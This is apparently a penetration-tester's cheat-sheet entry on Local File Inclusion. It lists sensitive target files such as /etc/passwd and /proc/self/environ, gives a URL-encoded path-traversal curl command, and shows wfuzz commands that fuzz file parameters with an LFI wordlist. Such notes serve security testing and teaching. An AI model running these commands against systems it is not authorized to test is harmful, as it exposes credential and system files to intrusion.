---
title: Local File Inclusion (LFI)
category: initial-access
subcategory: web-attacks
os: linux
command: curl 'target/page.php?file=../../../../etc/passwd'
tools: curl, wfuzz
---


### Common targets

- UNIX: `/etc/passwd`, `/var/log/apache2/access.log`, `/proc/self/environ`
- Windows: `..\..\..\windows\win.ini`, `..\..\..\windows\system32\drivers\etc\hosts`

### Path traversal via URL encoding

```bash
curl http://192.168.163.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords
```

### Fuzzing for LFI

```bash
wfuzz -hw -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt http://192.168.1.1/VulnWebApp/LFI-RFI/LFI.php?file=../../../../..FUZZ
wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt 'http://10.10.172.75/post.php?post=../../../../..FUZZ'
```
